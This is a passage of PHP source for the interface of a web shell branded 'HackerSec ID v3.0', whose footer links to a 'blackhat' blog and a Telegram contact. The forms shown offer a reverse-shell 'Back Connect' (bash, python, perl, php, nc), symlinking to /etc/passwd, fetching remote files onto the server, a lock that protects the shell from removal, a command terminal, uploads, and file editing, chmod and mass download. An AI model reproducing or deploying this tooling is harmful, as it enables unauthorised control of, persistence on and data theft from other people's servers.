    echo "<form method='POST'><input type='text' name='copy_source' placeholder='file.php or /full/path' style='width:100%;margin-bottom:8px;'><input type='text' name='copy_dest' placeholder='backup.php or /full/path' style='width:100%;margin-bottom:8px;'><button type='submit' name='copy_item' style='width:100%;'>Copy</button></form></div>";
    
    echo "<div style='background:rgba(20,20,20,0.5);padding:15px;border-radius:8px;'><strong style='color:#00d9ff;font-size:14px;display:block;margin-bottom:10px;'>🌐 URL Fetch</strong>";
    echo "<form method='POST'><input type='text' name='file_url' placeholder='https://example.com/file.zip' style='width:100%;margin-bottom:8px;'><input type='text' name='save_as' placeholder='filename.zip' style='width:100%;margin-bottom:8px;'><button type='submit' name='fetch_url' style='width:100%;'>Download</button></form></div>";
    
    echo "<div style='background:rgba(20,20,20,0.5);padding:15px;border-radius:8px;'><strong style='color:#00d9ff;font-size:14px;display:block;margin-bottom:10px;'>🔐 Symlink</strong>";
    echo "<form method='POST'><input type='text' name='symlink_target' placeholder='/etc/passwd' style='width:100%;margin-bottom:8px;'><input type='text' name='symlink_name' placeholder='passwd.txt' style='width:100%;margin-bottom:8px;'><button type='submit' name='create_symlink' style='width:100%;'>Create</button></form></div>";
    
    echo "<div style='background:rgba(20,20,20,0.5);padding:15px;border-radius:8px;'><strong style='color:#00d9ff;font-size:14px;display:block;margin-bottom:10px;'>🔗 Back Connect</strong>";
    echo "<form method='POST'><input type='text' name='bc_ip' placeholder='IP' style='width:100%;margin-bottom:8px;'><input type='text' name='bc_port' placeholder='Port' style='width:100%;margin-bottom:8px;'><select name='bc_type' style='width:100%;margin-bottom:8px;'><option value='bash'>Bash</option><option value='python'>Python</option><option value='perl'>Perl</option><option value='php'>PHP</option><option value='nc'>NC</option></select><button type='submit' name='bc_start' style='width:100%;'>Connect</button></form></div>";
    
    echo "<div style='background:rgba(20,20,20,0.5);padding:15px;border-radius:8px;'><strong style='color:#00d9ff;font-size:14px;display:block;margin-bottom:10px;'>🛡️ Watchdog</strong>";
    echo "<p style='color:#999;font-size:11px;margin-bottom:8px;'>Lock file from deletion/modification</p>";
    echo "<form method='POST'><input type='text' name='watchdog_target' placeholder='Leave empty = lock this shell or /path/to/file' style='width:100%;margin-bottom:8px;'><button type='submit' name='watchdog_on' class='sec' style='width:100%;'>Enable Lock</button></form></div>";
    
    echo "</div></div>";
}
elseif($menu == 'terminal'){
    echo "<div class='content-box'><h3>💻 Terminal</h3><form method='POST'><input type='text' name='terminal_cmd' placeholder='Command...' style='width:100%;margin-bottom:10px;'><button type='submit'>Execute</button></form></div>";
}
elseif($menu == 'upload'){
    echo "<div class='content-box'><h3>📤 Upload</h3><form method='POST' enctype='multipart/form-data'><input type='file' name='file' style='margin-bottom:10px;'><button type='submit'>Upload</button></form></div>";
    echo "<div class='content-box'><h3>➕ Create</h3><form method='POST' class='form-inline'><input type='text' name='newname' placeholder='Name' style='width:200px;'><select name='type'><option value='file'>File</option><option value='folder'>Folder</option></select><button type='submit' name='create'>Create</button></form></div>";
}
else{
    function file_row($item, $cwd, $is_dir){
        $full = $cwd.DIRECTORY_SEPARATOR.$item;
        $perm = substr(sprintf('%o', fileperms($full)), -4);
        $perm_color = is_writable($full) ? "style='color:#10b981;'" : "style='color:#ef4444;'";
        
        $stat = @stat($full);
        $owner = @posix_getpwuid($stat['uid']);
        $group = @posix_getgrgid($stat['gid']);
        $owner_name = $owner ? $owner['name'] : $stat['uid'];
        $group_name = $group ? $group['name'] : $stat['gid'];
        
        if($is_dir){
            $actions = "[<a href='?d=$cwd&rename=$item'>Rename</a>] [<a href='?d=$cwd&delete=$item' onclick='return confirm(\"Delete?\")'>Del</a>] [<a href='?d=$cwd&chmod=$item'>CHMOD</a>]";
        }else{
            $actions = "[<a href='?d=$cwd&edit=$item'>Edit</a>] [<a href='?d=$cwd&rename=$item'>Rename</a>] [<a href='?d=$cwd&delete=$item' onclick='return confirm(\"Delete?\")'>Del</a>] [<a href='?d=$cwd&chmod=$item'>CHMOD</a>]";
        }
        
        $icon = $is_dir ? "📁" : "📄";
        $link = $is_dir ? "?d=".urlencode($full) : "?d=".urlencode($cwd)."&edit=".urlencode($item);
        $check = "<input type='checkbox' name='select_files[]' value='".htmlspecialchars($item)."'>";
        return "<tr><td>$check</td><td><a href='$link' style='color:#fff;font-weight:500;'>$icon $item</a></td><td>".($is_dir?'Dir':'File')."</td><td $perm_color>$perm</td><td style='font-size:12px;color:#999;'>$owner_name:$group_name</td><td style='font-size:12px;'>$actions</td></tr>";
    }
    
    $items = scandir($cwd);
    $dirs = $files = [];
    foreach($items as $item){
        if($item === '.' || $item === '..') continue;
        $fullpath = $cwd.DIRECTORY_SEPARATOR.$item;
        if(!file_exists($fullpath)) continue;
        is_dir($fullpath) ? $dirs[] = $item : $files[] = $item;
    }
    
    echo "<form method='POST'><div class='content-box'><table><tr><th></th><th>Name</th><th>Type</th><th>Perm</th><th>User:Group</th><th>Action</th></tr>";
    foreach($dirs as $dir) echo file_row($dir, $cwd, true);
    foreach($files as $file) echo file_row($file, $cwd, false);
    echo "</table><button type='submit' name='mass_download' style='margin-top:15px;'>📥 Download Selected</button></div></form>";
}

function formatSize($bytes){
    if($bytes >= 1073741824){
        return number_format($bytes / 1073741824, 2).' GB';
    }elseif($bytes >= 1048576){
        return number_format($bytes / 1048576, 2).' MB';
    }elseif($bytes >= 1024){
        return number_format($bytes / 1024, 2).' KB';
    }else{
        return $bytes.' B';
    }
}

echo '<footer>HackerSec ID v3.0 | <a href="https://www.sukabumiblackhat.com" target="_blank">Blog</a> | <a href="https://t.me/anakhekerpro" target="_blank">Contact</a></footer></div></body></html>';
?>